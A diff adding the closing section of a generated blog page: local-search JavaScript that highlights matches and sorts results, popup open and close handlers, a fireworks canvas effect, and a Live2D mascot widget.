+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":"wanko","bottom":-30,"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
